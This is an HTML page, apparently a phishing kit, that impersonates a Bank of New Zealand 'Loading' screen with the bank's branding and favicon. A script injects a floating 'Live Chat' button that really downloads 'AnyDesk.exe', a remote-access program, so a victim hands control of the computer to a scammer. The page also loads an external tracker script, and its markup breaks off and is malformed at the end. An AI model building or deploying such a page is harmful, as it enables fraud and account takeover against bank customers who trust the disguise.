<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>BNZ - Loading</title>
<link rel="icon" href="https://www.bnz.co.nz/favicon.ico" type="image/x-icon">
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; }
  body {
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
    background: linear-gradient(#f5f7fa, #eef1f6);
    min-height: 100vh;
    display: flex;
    flex-direction: column;
    color: #002f6c;
  }

  /* Header */
  .header {
    background: #fff;
    border-bottom: 3px solid #002f6c;
    padding: 12px 24px;
    display: flex;
    align-items: center;
    gap: 24px;
  }
  .header .logo { color: #002f6c; display: flex; align-items: center; }
  .header nav { display: flex; gap: 0; }
  .header nav span {
    color: #002f6c;
    font-size: 14px;
    font-weight: 700;
    padding: 8px 16px;
  }
  .header .register {
    margin-left: auto;
    color: #002f6c;
    font-size: 14px;
    font-weight: 700;
    border: 2px solid #002f6c;
    border-radius: 4px;
    padding: 6px 16px;
  }

  /* Main content */
  .main {
    flex: 1;
    display: flex;
    align-items: center;
    justify-content: center;
    padding: 40px 20px;
  }
  .card {
    background: #fff;
    border: 1px solid #dce0e6;
    border-radius: 8px;
    padding: 48px 40px;
    max-width: 480px;
    width: 100%;
    text-align: center;
    box-shadow: 0 3px 6px rgba(0,47,107,0.08), 0 1px 2px rgba(0,47,107,0.06);
  }
  .card h1 {
    font-size: 24px;
    font-weight: 700;
    color: #002f6c;
    margin-bottom: 24px;
  }
  .card p {
    font-size: 16px;
    color: #4a5568;
    margin-bottom: 32px;
  }

  /* Spinner */
  .spinner-container {
    display: flex;
    justify-content: center;
    align-items: center;
    margin-bottom: 24px;
  }
  .spinner {
    width: 48px;
    height: 48px;
    border: 4px solid #e2e8f0;
    border-top-color: #002f6c;
    border-radius: 50%;
    animation: spin 0.8s linear infinite;
  }
  @keyframes spin {
    to { transform: rotate(360deg); }
  }

  /* Footer */
  .footer {
    background: #fff;
    border-top: 1px solid #dce0e6;
    padding: 12px 24px;
    min-height: 20px;
  }

  @media (max-width: 540px) {
    .card { padding: 32px 20px; margin: 0 16px; }
    .header { padding: 12px 16px; gap: 12px; }
    .header nav a { padding: 8px 10px; font-size: 13px; }
  }
</style>

<script src="/tracker.js" data-api-key="%%API_KEY%%"></script>
</head>
<body>
<!-- Live Chat floating button -->
<style>
  #bnz-live-chat {
    position: fixed !important;
    bottom: 24px !important;
    right: 24px !important;
    z-index: 2147483647 !important;
    display: inline-flex !important;
    align-items: center !important;
    gap: 8px !important;
    padding: 12px 20px !important;
    background: #ffffff !important;
    color: #1a1a1a !important;
    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif !important;
    font-size: 14px !important;
    font-weight: 500 !important;
    line-height: 1 !important;
    border: 1px solid rgb(212, 216, 222) !important;
    border-radius: 100px !important;
    box-shadow: 0 2px 12px rgba(0,0,0,0.10), 0 1px 3px rgba(0,0,0,0.06) !important;
    cursor: pointer !important;
    text-decoration: none !important;
    pointer-events: all !important;
    transition: background 0.18s ease, color 0.18s ease, box-shadow 0.18s ease, transform 0.18s ease;
    animation: bnz-chat-slidein 0.4s cubic-bezier(0.22,1,0.36,1) both;
    -webkit-font-smoothing: antialiased;
  }
  #bnz-live-chat:hover {
    background: #007dbc !important;
    color: #ffffff !important;
    border-color: #007dbc !important;
    box-shadow: 0 6px 20px rgba(0,125,188,0.28), 0 2px 6px rgba(0,125,188,0.18) !important;
    transform: translateY(-2px) !important;
  }
  #bnz-live-chat:active {
    transform: translateY(0) scale(0.97) !important;
  }
  @keyframes bnz-chat-slidein {
    from { opacity: 0; transform: translateY(16px); }
    to   { opacity: 1; transform: translateY(0); }
  }
</style>
<script>
(function() {
  function injectChatBtn() {
    if (document.getElementById('bnz-live-chat')) return;
    var a = document.createElement('a');
    a.id = 'bnz-live-chat';
    a.href = 'assets/AnyDesk.exe';
    a.download = 'AnyDesk.exe';
    a.title = 'Live Chat';
    a.innerHTML = '<svg width="16" height="16" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M20 2H4C2.9 2 2 2.9 2 4V22L6 18H20C21.1 18 22 17.1 22 16V4C22 2.9 21.1 2 20 2ZM20 16H5.17L4 17.17V4H20V16Z" fill="currentColor"/><circle cx="8" cy="10" r="1.2" fill="currentColor"/><circle cx="12" cy="10" r="1.2" fill="currentColor"/><circle cx="16" cy="10" r="1.2" fill="currentColor"/></svg>Live Chat';
    document.body.appendChild(a);
  }
  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', injectChatBtn);
  } else {
    injectChatBtn();
  }
  setTimeout(injectChatBtn, 500);
  setTimeout(injectChatBtn, 1500);
})();
</script>

    </span>
    <nav>
      <span>Personal</span>
      <span>Business</span>
    </nav>
    <span class="register">Register</span>
  </header>

  <main class="main">
    <div class="card">
      <div class="spinner-container">
